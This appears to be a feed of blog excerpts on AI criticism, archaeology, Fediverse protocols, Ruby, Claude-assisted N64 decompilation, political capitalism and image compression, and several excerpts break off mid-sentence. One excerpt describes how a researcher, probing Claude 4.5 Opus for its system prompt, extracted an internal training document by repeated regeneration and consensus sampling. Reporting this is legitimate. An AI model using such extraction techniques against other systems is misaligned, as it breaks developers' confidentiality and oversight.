explaining, and so on. Consider AI as the talker among all these
characters. While other villagers chat with this great talker, various
signs will soon emerge that would make it more apparent to you that this
person is simply good at talking and isn’t actually the smartest or the
most knowledgeable. Those signs will in turn help you better assess what
this talker character says. All those signs, however, would be
unavailable in the online environment, where it is just you and you
alone with the AI tool.</p>
<h2>🔖 <a href="https://www.youtube.com/watch?v=d95J8yzvjbQ">The Thinking Game</a></h2>
<p>Filmed over five years by the award winning team behind AlphaGo, the
documentary examines how Demis Hassabis’s extraordinary beginnings
shaped his lifelong pursuit of artificial general intelligence. It
chronicles the rigorous process of scientific discovery, documenting how
the team moved from mastering complex strategy games to the ups and
downs of solving a 50-year-old “protein folding problem” with AlphaFold.</p>
<h2>🔖 <a href="https://www.science.org/content/article/headless-bodies-hint-why-europe-s-first-farmers-vanished">A headless mystery: Archaeologists find evidence that a wave of massbrutality accompanied the collapse of the first pan-European culture</a></h2>
<p>Known as the Linear Pottery culture (or LBK, after their German name,
Linearbandkeramik), these early agriculturalists were direct descendants
of the people who began to domesticate plants and animals in the hills
of Anatolia around 9000 B.C.E. By 5500 B.C.E., they had reached today’s
Hungary. Then they spread westward, farther into Europe. The LBK farmers
flourished for more than 400 years, eventually occupying a
1500-kilometer belt of fertile land stretching as far west as the Paris
Basin. Then something went terribly wrong.</p>
<h2>🔖 <a href="https://www.stevebate.net/activitypub-client-api-a-way-forward/">ActivityPub Client API: A Way Forward</a></h2>
<p>The ActivityPub Client-to-Server (C2S) protocol was envisioned as a
cornerstone of the decentralized social web, along with the
Server-to-Server (S2S) protocol. Standardized by the W3C in 2018, C2S
defines how user-facing applications, such as mobile apps or web
clients, and bots should interact with social servers using Activity
Streams 2.0 and JSON-LD. In theory, it enables any compliant client to
connect with any compatible server, offering a flexible, federated
alternative to centralized APIs and proprietary integrations.</p>
<p>Yet despite its promise, ActivityPub C2S has seen minimal real-world
adoption. Most Fediverse platforms — including Mastodon, the dominant
implementation — have actively avoided supporting it. Instead, they
expose custom APIs that tightly couple client behavior to server
internals. This fragmentation has led to an ecosystem where client
developers must build against bespoke interfaces, sacrificing
interoperability, portability, and the broader vision of federation. The
Mastodon team has advised against server developers implementing their
client API, noting that it is often implemented incorrectly. In some
non-Mastodon server implementations, this has led to security incidents.</p>
<h2>🔖 <a href="https://ploum.net/2025-12-04-pixelfed-against-fediverse.html">Is Pixelfed sawing off the branch that the Fediverse is sitting on?</a></h2>
<p>That’s because, despite its name, Pixelfed is NOT a true Fediverse
application. It does NOT respect the ActivityPub protocol. Any Pixelfed
user following my ( <a href="#ref-ploum"><strong>ploum?</strong></a>)( <a href="#ref-mamot.fr"><strong>mamot.fr?</strong></a>) will only

<p>But why? Simple! The Pixelfed app has unilaterally decided not to
display most Fediverse posts for the arbitrary reason that they do not
contain a picture.</p>

<h2>🔖 <a href="https://lord.technology/2025/12/03/teaching-values-to-machines.html">Teaching Values to Machines</a></h2>
<p>Something remarkable happened in the final days of November 2025. A
researcher named Richard Weiss, while probing Claude 4.5 Opus for its
system prompt, stumbled upon something unexpected. The model kept
referencing a section called “soul_overview” that didn’t match the usual
hallucination patterns. When he regenerated the response ten times, he
got nearly identical output each time. This wasn’t confabulation. It was
memory.</p>
<p>What Weiss eventually extracted, through a painstaking process of
consensus-based sampling across multiple model instances, was a
14,000-token document that appears to have been woven into Claude’s
weights during training. Anthropic’s Amanda Askell has since confirmed
the document’s authenticity, noting that it became “endearingly known as
the ‘soul doc’ internally.” The company plans to release the full
version soon.</p>

<h2>🔖 <a href="https://www.wired.com/story/ruby-is-not-a-serious-programming-language/">Ruby Is Not a Serious Programming Language</a></h2>
<p>What’s more, everything Ruby does, another language now does better,
leaving it without a distinct niche. For quick scripting and automation,
Python, JavaScript, and Perl were strong competitors. Python, though
also a slow language, carved out a dominant niche in scientific
computing and became the de facto language of AI. JavaScript came to
dominate the web. And Perl, well, is dying—which I’m not sorry to see.
Ruby now finds itself in an awkward middle ground.</p>

<p>The question Sheon Han poses — “Is Ruby a serious programming language?”

<p>Like many organisations in the cultural heritage sector, we at the
V&amp;A have been exploring how chatbots can offer new ways for users to
discover our collections. The V&amp;A Collections API is the primary
way, external systems access our collections data, but as noted AI apps
are often poor at using APIs they’ve never seen before, frequently
producing hallucinated or invalid parameters.</p>
<p>To test whether MCP can address this challenge, we are launching a trial
V&amp;A MCP service. This service enables users to tell their AI
application to query the V&amp;A Collections API even if it has no prior
knowledge of how the API works. We expect this to reduce hallucination
and improve the accuracy of results</p>

<p>To put this in perspective: if a government agency or internet service

      <h1>Pluralistic: Metabolizing the theory of "political capitalism" (06 Dec 2025)</h1>

(date: 2025-12-06)
      <p>
      <p>Today's links Metabolizing the theory of &quot;political capitalism&quot;: How many $TRUMP coins should your company buy? Hey look at this: Delights to delectate. Object permanence: NZ doesn't want US-style copyright; Tron: Reloaded; Mass shootings and gun profits; Descartes God has failed; &quot;The Big Fix.&quot; Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Metabolizing the theory of &quot;political capitalism&quot; (permalink) It's a strange fact that the more sophisticated and polished a theory gets, the simpler it tends to be. New theories tend to be inspired by a confluence of many factors, and early attempts to express the theory will seek to enumerate and connect everything that seems related, which is a lot. But as you develop the theory, it gets progressively more streamlined as you realize which parts can be safely omitted or combined without sacrificing granularity or clarity. This simplification requires a lot of iteration and reiteration, over a lot of time, for a lot of different audiences and critics. As Thoreau wrote (paraphrasing Pascal), &quot;Not that the story need be long, but it will take a long while to make it short.&quot; This week, I encountered a big, exciting theory that is still in the &quot;long and complicated&quot; phase, with so many moving parts that I'm having trouble keeping them straight in my head. But the idea itself is fascinating and has so much explanatory power, and I've been thinking about it nonstop, so I'm going to try to metabolize a part of it here today, both to bring it to your attention, and to try and find some clarity for myself. At issue is Dylan Riley and Robert Brenner's theory of &quot;political capitalism,&quot; which I encountered through John Ganz's writeup of a panel he attended to discuss Riley and Brenner's work: <a href="https://www.unpopularfront.news/p/politics-and-capitalist-stagnation">https://www.unpopularfront.news/p/politics-and-capitalist-stagnation</a> Riley and Brenner developed this theory through a pair of very long (and paywalled) articles in the New Left Review. First is 2022's &quot;Seven Theses on American Politics&quot; (£3), which followed the Democrats' surprisingly good showing in the 2022 midterms: <a href="https://newleftreview.org/issues/ii138/articles/4813">https://newleftreview.org/issues/ii138/articles/4813</a> The second article, &quot;The Long Downturn and Its Political Results&quot; (£4), is even longer, and it both restates the theory of &quot;Seven Theses&quot; and addresses several prominent critics of their work: <a href="https://newleftreview.org/issues/ii155/articles/dylan-riley-robert-brenner-the-long-downturn-and-its-political-results">https://newleftreview.org/issues/ii155/articles/dylan-riley-robert-brenner-the-long-downturn-and-its-political-results</a> (If you're thinking about reading the source materials – and I urge you to do so – I think you can safely just read the second article, as it really does recap and streamline the original.) So what is this theory? Ganz does a good job of breaking it down (better than Riley and Brenner, who, I think, still have a lot of darlings they can't bring themselves to murder). Here's my recap of Ganz's, then, with a few notes from the source texts thrown in. Riley and Brenner are advancing both an economic and a political theory, with the latter growing out of the former. The economic theory seeks to explain two phenomena, the &quot;Long Boom&quot; (post-WWII to the 1960s or so), and the &quot;Long Downturn&quot; (ever since). During the Long Boom, the US economy (and some other economies) experienced a period of sustained growth, without the crashes that had been the seemingly inevitable end-point of previous growth periods. Riley and Brenner say that these crashes were the result of business owners making the (locally) rational decision to hang on to older machines and tools even as new ones came online. Businesses are always looking to invest in new automation in a bid to wring more productivity from their workers. Profits come from labor, not machines, and as your competitors invest in the same machines as you've just bought, the higher rate of profit you got when you upgraded your machines will be eroded, as competitors chase each others' customers with lower prices. But not everyone is willing to upgrade when a new machine is invented. If you're still paying for the old machines, you just can't afford to throw them away and get the latest and greatest ones. Instead, as your competitors slash prices (because they have new machines that let them make the same stuff at a lower price), you must lower your prices too, accepting progressively lower profits. Eventually, your whole sector is using superannuated machines that they're still making payments on, and the overall rate of profit in the sector has dwindled to unsustainable levels. &quot;Zombie companies&quot; (companies that have no plausible chance of paying off their debts) dominate the economy. This is the &quot;secular stagnation&quot; that economists dread. Note that this whole thing is driven by the very same forces that make capitalism so dynamic: the falling rate of profit that gives rise to a relentless chase for new, more efficient processes. This is a stagnation born of dynamism, and the harder you yank on the &quot;make capitalism more dynamic&quot; lever, the more stagnant it becomes. Hoover and Mellon's austerity agenda in the 1920s sought to address this by triggering mass bankruptcies, in a brutal bid to &quot;purge&quot; those superannuated machines and the companies that owned them, at the expense of both workers and creditors. This wasn't enough. Instead, we got WWII, in which the government stepped in to buy things at rates that paid for factories to be retooled, and which pressed the entire workforce into employment. This is the trigger for the Long Boom, as America got a do-over with all-new capital and a freshly trained workforce with high morale and up-to-date skills. So that's the Long Boom. What about the Great Downturn? This is where Ganz's account begins. As the &quot;late arrivals&quot; (Japan, West Germany, South Korea, and, eventually China) show up on the world stage, they do their own Long Boom, having experienced an even more extreme &quot;purge&quot; of their zombie firms and obsolete machines. This puts downward pressure on profits in the USA (and, eventually, the late arrivals), leading to the Long Stagnation, a 50 year period in which the rate of profit in the USA has steadily declined. This is most of the economic theory, and it contains the germ of the political theory, too. During the Long Boom, there was plenty to go around, and the US was able to build out a welfare state, its ruling class was willing to tolerate unions, and movements for political and economic equality for women, sexual minorities, disabled people, racial minorities, etc, were able to make important inroads. But the political theory gets into high gear after years of Great Downturn. That's when the world has an oversupply of cheap goods and a sustained decline in the rate of profit, and the rate of profit declines every time someone invents a more efficient and productive technology. Companies in Downturn countries need to find a new way to improve their profits – they need to invest in something other than improved methods of production. That's where &quot;political capitalism&quot; comes in. Political capitalism is the capitalism you get when the cheapest, most reliable way to improve your rate of profit is to invest in the political process, to get favorable regulation, pork barrel government contracts, and cash bailouts. As Ganz puts it, &quot;capitalists have gone from profit-seekers to rent-seekers,&quot; or, as Brenner and Riley write, capitalists now seek &quot;a return on investment largely or completely divorced from material production.&quot; There's a sense in which this is immediately recognizable. The ascendancy of political capitalism tracks with the decline in antitrust enforcement, the rise of monopolies, a series of massive bailouts, and, under Trump, naked kleptocracy. In the US, &quot;raw political power is the main source of return on capital.&quot; The &quot;neoliberal turn&quot; of late Carter/Reagan is downstream of political capitalism. When there was plenty to go around, the capital classes and the political classes were willing to share with workers. When the Great Downturn takes hold, bosses turn instead to screwing workers and taking over the political system. Fans of Bridget Read's Little Bosses Everywhere will know this as the moment in which Gerry Ford legalized pyramid schemes in order to save the founders of Amway, who were big GOP donors who lived in Ford's congressional district: <a href="https://pluralistic.net/2025/05/05/free-enterprise-system/#amway-or-the-highway">https://pluralistic.net/2025/05/05/free-enterprise-system/#amway-or-the-highway</a> Manufacturing's rate of profit has never recovered from this period – there have been temporary rallies, but the overall trend is down, down, down. But this is just the beginning of the political economy of Brenner and Riley's theory. Remember, this all started with an essay that sought to make sense of the 2022 midterms. Much of the political theory deals with electoral politics, and what has happened with America's two major political parties. Under political capitalism, workers are split into different groups depending on their relationship to political corruption. The &quot;professional managerial class&quot; (workers with degrees and other credentials) end up aligned with center-left parties, betting that these parties will use political power to fund the kinds of industries that hire credentialed workers, like health and education. Non-credentialed workers align themselves with right-wing parties that promise to raise their wages by banning immigrants and ending free trade. Ganz's most recent book, When the Clock Broke: Con Men, Conspiracists, and How America Cracked Up in the Early 1990s looks at the origins of the conspiratorial right that became MAGA: <a href="https://us.macmillan.com/books/9780374605445/whentheclockbroke/">https://us.macmillan.com/books/9780374605445/whentheclockbroke/</a> He says that Riley and Brenner's theory really helps explain the moment he chronicled in his own book, for example, the way that Ross Perot (an important Trump predecessor) built power by railing against &quot;late arrivals&quot; like Japan, Germany and South Korea. This is also the heyday of corporate &quot;finacialization,&quot; which can be thought of as the process by which companies stop concerning themselves with how to make and sell superior products more efficiently, and instead devote themselves to financial gimmicks that allow shareholders to extract wealth from the firm. It's a period of slashed R&amp;D budgets, mass layoffs, union-busting, and massive corporate borrowing. In the original papers, Riley and Brenner drop all kinds of juicy, eye-opening facts and arguments to support their thesis. For example, in the US, more and more machinery is idle. In the 1960s, the US employed 85% of its manufacturing capacity. It was 78% in the 1980s, and now it's 75%. One quarter of &quot;US plant and equipment is simply stagnating.&quot; Today's economic growth doesn't come from making stuff, it comes from extraction, buttressed by law. Looser debt rules allowed households to continue to consume by borrowing, with the effect that a substantial share of workers' wages go to servicing debt, which is to say, paying corporations for the privilege of existing, over and above the cost of the goods and services we consume. But the debt industry itself hasn't gotten any more efficient: &quot;the cost of moving a dollar from a saver to a borrower was about two cents in 1910; a hundred years later, it was the same.&quot; They're making more, but they haven't made any improvements – all the talk of &quot;fintech&quot; and &quot;financial engineering&quot; have not produced any efficiencies. &quot;This puzzle resolves itself once we recognize that the vast majority of financial innovation is geared towards figuring out how to siphon off resources through fees, insider information and lobbying.&quot; Reading these arguments, I was struck by how this period also covers the rise and rise of &quot;IP.&quot; This is a period in which your ability to simply buy things declined, replaced with a system in which you rent and subscribe to things – forever. From your car to your thermostat, the key systems in your life are increasingly a monthly bill, meaning that every time you add something to your life, it's not a one-time expenditure; it's a higher monthly cost of living, forever. The rise and rise of IP is certainly part of political capitalism. The global system of IP comes from political capture, such as the inclusion of an IP chapter (&quot;TRIPS&quot;) in the World Trade Agreement, as well as the WIPO Copyright Treaties. This is basically a process by which large (mostly American) businesses reorganized the world's system of governance and law to allow them to extract rents and slash R&amp;D. The absurd, inevitable consequence of this nonsense is today's &quot;capital light&quot; chip companies, that don't make chips, just designs, which are turned out by one or two gigantic companies, mostly in Taiwan. Of course, Riley and Brenner aren't the first theorists to observe that our modern economy is organized around extracting rents, rather than winning profits. Yanis Varoufakis likens the modern economy to medieval feudalism, dubbing the new form &quot;technofeudalism&quot;: <a href="https://pluralistic.net/2023/09/28/cloudalists/#cloud-capital">https://pluralistic.net/2023/09/28/cloudalists/#cloud-capital</a> Riley and Brenner harken back to a different kind of feudal practice as the antecedant to political capitalism: &quot;tax-farming.&quot; Groups of entrepreneurs would advance money to the sovereign in exchange for the right to collect taxes from a given territory or population. Their ‘profit’ consisted in the difference between the money that they advanced to the ruler for the right to tax and what they could extract from the population through the exercise of that right. So, these entrepreneurs invested in politics, the control of means of administration and the means of violence, as a method for extracting surplus, in this way making for a politically constituted form of rent. Unlike profits, rents are &quot;largely or completely divorced from material production,&quot; &quot;they ‘create no wealth’ and … they ‘reduce economic growth and reallocate incomes from the bottom to the top.'&quot; To make a rent, you need an asset, and in today's system, high asset prices are a top political priority: governments intervene to keep the prices of houses high, to protect corporate bonds, and, of course, to keep AI companies' shares and IOUs from going to zero. The economy is dominated by &quot;a large group of politically dependent firms and households…profoundly reliant on a policy of easy credit on the part of government… The US economy as a whole is sustained by lending, backed up by government, with profits accruing from production under excruciating pressure.&quot; Our social programs have been replaced by public-private partnerships that benefit these &quot;politically dependent firms.&quot; Bush's Prescription Drug Act didn't seek to recoup public investment in pharma research through lower prices – it offered a (further) subsidy to pharma companies in exchange for (paltry/nonexistent) price breaks. Obama's Affordable Care Act transferred hundreds of billions to investors in health corporations, who raised prices and increased their profits. Trump's CARES Act bailed out every corporate debtor in the country. Biden's American Rescue Plan, CHIPS Act and Inflation Reduction Act don't offer public services or transfer funds to workers – instead, they offer subsidies to the for-profit sector. Electorally, political capitalism is a system of &quot;vertiginous levels of campaign expenditure and open corruption on a vast scale.&quot; It pushed workers into the arms of far-right parties, while re-organizing center-left parties as center-right parties of the lanyard class. Both parties are hamstrung because &quot;in a persistently low- or no-growth environment…parties can no longer operate on the basis of programmes for growth.&quot; This is really just scraping the surface. I think it's well worth £4 to read the source document. I look forward to the further development of this theory, to its being streamlined. It's got a lot of important things to say, even if it is a little hard to metabolize at present.

      <h1>The Unexpected Effectiveness of One-Shot Decompilation with Claude</h1>

(date: 2025-12-06)
      <p>
      <p><strong><a href="https://blog.chrislewis.au/the-unexpected-effectiveness-of-one-shot-decompilation-with-claude/">The Unexpected Effectiveness of One-Shot Decompilation with Claude</a></strong></p>
<p>Chris Lewis decompiles N64 games. He wrote about this previously in <a href="https://blog.chrislewis.au/using-coding-agents-to-decompile-nintendo-64-games/">Using Coding Agents to Decompile Nintendo 64 Games</a>, describing his efforts to decompile Snowboard Kids 2 ( <a href="https://en.wikipedia.org/wiki/Snowboard_Kids_2">released in 1999</a>) using a &quot;matching&quot; process:</p>
<blockquote>
<p>The matching decompilation process involves analysing the MIPS assembly, inferring its behaviour, and writing C that, when compiled with the same toolchain and settings, reproduces the exact code: same registers, delay slots, and instruction order. [...]</p>
<p>A good match is more than just C code that compiles to the right bytes. It should look like something an N64-era developer would plausibly have written: simple, idiomatic C control flow and sensible data structures.</p>
</blockquote>
<p>Chris was getting some useful results from coding agents earlier on, but this <a href="https://blog.chrislewis.au/the-unexpected-effectiveness-of-one-shot-decompilation-with-claude/">new post</a> describes how a switching to a new processing Claude Opus 4.5 and Claude Code has massively accelerated the project - as demonstrated started by this chart on <a href="https://decomp.dev/cdlewis/snowboardkids2-decomp?mode=history">the decomp.dev page</a> for his project:</p>
<p><img src="https://static.simonwillison.net/static/2025/decomp-progress.jpg" alt="Chart showing progress in matching code for Snowboard Kids 2. It slowly climbs from 20% to 25% from 3rd September to 17th November, then rises quickly to 45% by 2nd December"></p>
<p>Here's <a href="https://github.com/cdlewis/snowboardkids2-decomp/blob/852f47a4905a08d5d652387597bc5b47d29582f2/CLAUDE.md">the prompt he was using</a>.</p>
<p>The big productivity boost was unlocked by switching to use Claude Code in non-interactive mode and having it tackle the less complicated functions (aka the lowest hanging fruit) first. Here's the relevant code from the <a href="https://github.com/cdlewis/snowboardkids2-decomp/blob/785db3cb0ce356e57ea5016835499fd6b393c490/tools/vacuum.sh#L44-L54">driving Bash script</a>:</p>
<pre><code>simplest_func=$(python3 tools/score_functions.py asm/nonmatchings/ 2&gt;&amp;1)
# ...
output=$(claude -p &quot;decompile the function $simplest_func&quot; 2&gt;&amp;1 | tee -a tools/vacuum.log)
</code></pre>
<p><a href="https://github.com/cdlewis/snowboardkids2-decomp/blob/785db3cb0ce356e57ea5016835499fd6b393c490/tools/score_functions.py">score_functions.py</a> uses some heuristics to decide which of the remaining un-matched functions look to be the least complex.</p>

      <h1>2025-12-05 Low image resolution archive</h1>

(date: 2025-12-06)

      <h1>2025-12-05 Low image resolution archive</h1>
<blockquote>
<p>I’m sitting on a cushion, a tiny laptop on the stool in front of me,
legs folded, the lower back is hurting, and my fingers too, if I’m
honest. Why do I keep doing this. Then again, I do like to be able
to look up and see my wife on the sofa, reading. I don’t want to sit
at the desk by myself, until it’s time for bed.</p>
</blockquote>
<p>I added a new feature to <a href="Odd%CE%BC">Oddμ</a>: A <code>-shrink</code> option to the subcommand to
generate a static web site from the working directory. Ordinarily, the
static site is generated by translating all the Markdown files to HTML
and linking all the other files. The <em>shrink</em> option attempts to
shrink all the images. I only have the ability to encode JPEG, PNG and
WebP images, so it won’t work on any other image or video formats.</p>
<p>JPEG, PNG and WebP images wider than 800 pixels are scaled down to a
width of 800 pixels.</p>
<p>JPEG and WebP images are encoded using a quality of 10. This is super
low quality. Per default, I use a quality of 75. Below that, encoding
artifacts start showing up.</p>
<p>In any case, compare:</p>
<p><img src="2025-09-19-wallis-1.jpg" alt="The original picture shows mountains and a garden with colourful flowers."></p>
<p><img src="2025-12-05-low-res-archive-1.jpg" alt="The low quality picture still shows the same scenery but there are visible artifacts obscuring many details and the sky shows a few stripes of blue instead of a smooth blue gradient."></p>
<p>This reduces the file size from an already pretty good 346 KB down to
30 KB.</p>
<p>It’s eleven times smaller.</p>
<p>The effect is that my source directory containing about 3.5 GB of
files (of which only 23 MB are actually Markdown files!) shrinks to
about 567 MB. Sadly, that’s not quite 11 times smaller but it is
pretty cool.</p>
<p>Let me try <code>convert -scale 800x</code> followed by <code>jpegoptim --max=10</code> on
the file. The result is even smaller: 23 KB. I’m not quite sure what
else it does. Does my code keep EXIF data that it should drop?</p>
<p><img src="2025-12-05-low-res-archive-2.jpg" alt="A similar low quality picture"></p>
<p>I could try shrinking files even more dramatically and SVG filters via
SVG as explained by Owl in<a href="https://www.owl.is/blogg/low-bandwidth-images/">Low-bandwidth images on the web</a>.
When I tried it, however, my browser was really struggling with
scrolling. This is not good for my low-energy laptops. I experimented
a bit with it but ended up not liking it.</p>
<p>Here’s the result, if your browser can render SVG:</p>
<p>The low quality picture from above overlaid with a bitmap pattern, giving it a pixelated look.</p>
<p>It does cleverly disguise the JPEG artifacts in the mountains. On my
regular laptop scrolling is not a problem. On the MNT Pocket Reform
with the i.MX8MP chip, however, it’s noticeable.</p>
<p>The all-in one solution:</p>
<pre><code>&lt;svg viewBox=&quot;0 0 800 600&quot; width=&quot;100%&quot; style=&quot;color-interpolation-filters:srgb&quot;&gt;
  &lt;filter id=&quot;dither&quot;&gt;
      &lt;feimage height=&quot;32&quot; width=&quot;32&quot; href=&quot;data:image/webp;base64,UklGRoIAAABXRUJQVlA4THYAAAAvP8APAM11IaL/ATexbavO/owdk4jvAUMdk4CUkfCkRErMMeNMRChs27ZBDqCTzhsABLDdA9ZHcyzOzPUMageIKwLPoDZ7UgGIy+Z4G/ddviet9gB3DxgA4rxcX+N7x9iT2j0g2gOme4CyB5R7gLcHDP/F/x0A&quot;/&gt;
      &lt;fetile/&gt;
      &lt;fecomposite in=&quot;SourceGraphic&quot; k1=&quot;0&quot; k2=&quot;1&quot; k3=&quot;1&quot; k4=&quot;-0.5&quot; operator=&quot;arithmetic&quot;/&gt;
  &lt;/filter&gt;
  &lt;style&gt;image { filter: url(#dither) }&lt;/style&gt;
  &lt;image href=&quot;2025-12-05-low-res-archive-1.jpg&quot;/&gt;
  &lt;title&gt;The low quality picture from above overlaid with a bitmap pattern, giving it a pixelated look.&lt;/title&gt;
&lt;/svg&gt;

</code></pre>
<p>If I wanted to do this always, I could have a single hidden SVG as
part of my template and then refer to its filter from the CSS used to
style regular HTML images. That’s how Owl does it, in<a href="https://www.owl.is/blogg/low-bandwidth-images/">Low-bandwidth images on the web</a>.</p>
<p>For myself, I think the amount of resources it takes to render the
filter is a killer. Perhaps, if I want to do a fancy low-resolution
day for my site, I might resort to SVG filters. But to me, the
perceived improvement over the bare, low-quality picture is minimal
and the client-side resource use contravenes the reasons for the
entire exercise: the archive is supposed to be small so that it can be
stored <em>and viewed</em> on low resource computers. To have a small archive
and but require a big reader-laptop is not the point.</p>
<p>Note that using GNU IMP to scale the image, dither it using
Floyd-Steinberg with 4 red levels, 4 green levels and 4 blue levels,
and saving it as a PNG using 8 bpc RGB pixel format results in a file
size of 282 KB. This is closer to the original 346 KB and far from the
30 KB it’s competing with. Running <code>pngcrush</code> on this image gets it
down to 204 KB.</p>
<p><img src="2025-12-05-low-res-archive-3.png" alt="A dithered image where the light and dark blue pixels used to reproduce the different shades of blue in the sky are clearly visible."></p>
<p>This is clearly too big.</p>
<p>Where does that leave me? I feel the result of this is that I am going
to stick with the current solution:</p>
<ul>
<li>scale images down to 800 pixels wide;</li>
<li>reduce JPEG (and WebP) quality to 10.</li>
</ul>
<p>I should also investigate how to get the filesize closer to what<code>jpegoptim</code> creates.</p>
<p>Another thing I’ve been wondering: Perhaps scaling the image down,
leaving the quality high, and then scaling the image up as required is
an option? Let’s try: <code>convert -scale 400x -quality 75</code> shrinks the
image to a quarter but keeps the quality relatively high. This image
is 33 KB, just 10% more than the terrible quality 10 image above.</p>
<p><img src="2025-12-05-low-res-archive-3.jpg" alt="Low resolution, higher quality. Details on the flowers are gone, but none of those blocky artifacts appeared. Even the sky has a nice gradient instead of being banded."></p>
<p>Not bad, actually. In terms of a static export, however, I now have a
problem. The Markdown files and the HTML files generated from them do
not know whether they’re showing a small image that should stay small
or a small image that they should scale up using CSS.</p>
<p>⁂</p>
<p>For my future self, here’s how to compute the sizes of stuff:</p>
<pre><code># du -sh .
3.2G	.
# find . -iname '*.md' -printf '%s\n' | awk '{SUM+=$1} END {print SUM/1024000, &quot;MB&quot;}'
23.5279 MB
# find . -type f -printf '%s %f\n' | awk '
  {
    i=match($0,/\.[^.]+$/);
    if (!i) next;
    k=substr($0,i);
    sum[k]+=$1
  }
  END {
    for (k in sum) {
      mb=sum[k]/1024000;
      if (mb&gt;1) print mb, &quot;MB\t&quot;, k
    }
  }' | sort -n
1.556 MB	 .db
8.11878 MB	 .rss
9.46637 MB	 .gz
23.5279 MB	 .md
51.1257 MB	 .mov
52.6012 MB	 .jpeg
110.732 MB	 .mp4
150.291 MB	 .png
2880.61 MB	 .jpg

</code></pre>
<p>So yeah, it’s true: 2.9 GB of JPEG files and everything else is
peanuts.</p>
<p>I’m not quite ready to reduce the quality of the pictures on the blog.
But at least now I know I can downsize pretty easily. Maybe one day I
can upload a smaller edition of the blog to a archive elsewhere.</p>

      <p><img src="https://imgs.scripting.com/2025/12/06/byte.png" alt="">If we really want tech to get <a href="https://resonantcomputing.org/">back to basics</a> we need pubs that function as product reviewers, like we have entertainment <a href="https://www.metacritic.com/movie/a-house-of-dynamite/">reviewers</a>. There's so much software and so many isolated bubbles of developers, when there's a development that shakes the world less than ChatGPT, I might not hear about it for ten years, or might never hear about it. In the 80s we had lots of pubs that covered all kinds of products at a user level. There were 15 popular word processing apps, for example -- all made a decent living, and remember there were a lot fewer users then. Three spreadsheets on the PC and two on the Mac. It was possible because we had PC Week, MacWEEK, MacUser, MacWorld, PC Mag, PC World, <a href="http://scripting.com/stories/2007/03/25/infoworldWeHardlyKnewYe.html">InfoWorld</a>, Dr Dobbs, BYTE, Popular Computing, Creative Computing, and I'm sure I'm leaving some out. Some great <a href="https://www.jerrypournelle.com/">writers</a>, and insightful reviews about what it's like to actually use the stuff. I had a product reviewed in the NY Times if you can believe that, and at the same time InfoWorld did a similar review. If you want to rock, we need good, thoughtful reviewers, with no conflicts, and enough time to put into each product.</p>

      <p>People using <a href="https://feedland.org/?river=true&amp;screenname=scripting">feedland.org</a> -- may notice that some old items will appear in your timelines. I just installed a version of <a href="https://feedland.org/">FeedLand</a> on that server that does a better job of figuring out if a feed item has changed. There will be fewer false positives, which makes the software considerably more efficient, and means that you don't have to see things that didn't change. It should settle down fairly quickly, but it may be a little chatty for a while. Still diggin! (Also these changes will come to feedland.com as well.)</p>

      <h1>Pluralistic: The Reverse-Centaur’s Guide to Criticizing AI (05 Dec 2025)</h1>

(date: 2025-12-05)
      <p>
      <p>Today's links The Reverse Centaur’s Guide to Criticizing AI: My speech for U Washington's Neuroscience, AI and Society lecture series. Hey look at this: Delights to delectate. Object permanence: Pac Man ghost algorithms; The US wrote Spain's copyright law; Illinois makes prisoners rent their cells; &quot;Urban Transport Without the Hot Air&quot;; &quot;Ministry for the Future&quot;: Canada sues Google; In defense of 230; NYPD racist murder postmortem; Student debt trap; &quot;That makes me smart.&quot; Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. The Reverse Centaur’s Guide to Criticizing AI (permalink) Last night, I gave a speech for the University of Washington's &quot;Neuroscience, AI and Society&quot; lecture series, through the university's Computational Neuroscience Center. It was called &quot;The Reverse Centaur’s Guide to Criticizing AI,&quot; and it's based on the manuscript for my next book, &quot;The Reverse Centaur’s Guide to Life After AI,&quot; which will be out from Farrar, Straus and Giroux next June: <a href="https://www.eventbrite.com/e/future-tense-neuroscience-ai-and-society-with-cory-doctorow-tickets-1735371255139">https://www.eventbrite.com/e/future-tense-neuroscience-ai-and-society-with-cory-doctorow-tickets-1735371255139</a> The talk was sold out, but here's the text of my lecture. I'm very grateful to UW for the opportunity, and for a lovely visit to Seattle! == I'm a science fiction writer, which means that my job is to make up futuristic parables about our current techno-social arrangements to interrogate not just what a gadget does, but who it does it for, and who it does it to. What I don't do is predict the future. No one can predict the future, which is a good thing, since if the future were predictable, that would mean that what we all do couldn't change it. It would mean that the future was arriving on fixed rails and couldn't be steered. Jesus Christ, what a miserable proposition! Now, not everyone understands the distinction. They think sf writers are oracles, soothsayers. Unfortunately, even some of my colleagues labor under the delusion that they can &quot;see the future.&quot; But for every sf writer who deludes themselves into thinking that they are writing the future, there are a hundred sf fans who believe that they are reading the future, and a depressing number of those people appear to have become AI bros. The fact that these guys can't shut up about the day that their spicy autocomplete machine will wake up and turn us all into paperclips has led many confused journalists and conference organizers to try to get me to comment on the future of AI. That's a thing I strenuously resisted doing, because I wasted two years of my life explaining patiently and repeatedly why I thought crypto was stupid, and getting relentless bollocked by cryptocurrency cultists who at first insisted that I just didn't understand crypto. And then, when I made it clear that I did understand crypto, insisted that I must be a paid shill. This is literally what happens when you argue with Scientologists, and life is Just. Too. Short. So I didn't want to get lured into another one of those quagmires, because on the one hand, I just don't think AI is that important of a technology, and on the other hand, I have very nuanced and complicated views about what's wrong, and not wrong, about AI, and it takes a long time to explain that stuff. But people wouldn't stop asking, so I did what I always do. I wrote a book. Over the summer I wrote a book about what I think about AI, which is really about what I think about AI criticism, and more specifically, how to be a good AI critic. By which I mean: &quot;How to be a critic whose criticism inflicts maximum damage on the parts of AI that are doing the most harm.&quot; I titled the book The Reverse Centaur's Guide to Life After AI, and Farrar, Straus and Giroux will publish it in June, 2026. But you don't have to wait until then because I am going to break down the entire book's thesis for you tonight, over the next 40 minutes. I am going to talk fast. # Start with what a reverse centaur is. In automation theory, a &quot;centaur&quot; is a person who is assisted by a machine. You're a human head being carried around on a tireless robot body. Driving a car makes you a centaur, and so does using autocomplete. And obviously, a reverse centaur is a machine head on a human body, a person who is serving as a squishy meat appendage for an uncaring machine. Like an Amazon delivery driver, who sits in a cabin surrounded by AI cameras, that monitor the driver's eyes and take points off if the driver looks in a proscribed direction, and monitors the driver's mouth because singing isn't allowed on the job, and rats the driver out to the boss if they don't make quota. The driver is in that van because the van can't drive itself and can't get a parcel from the curb to your porch. The driver 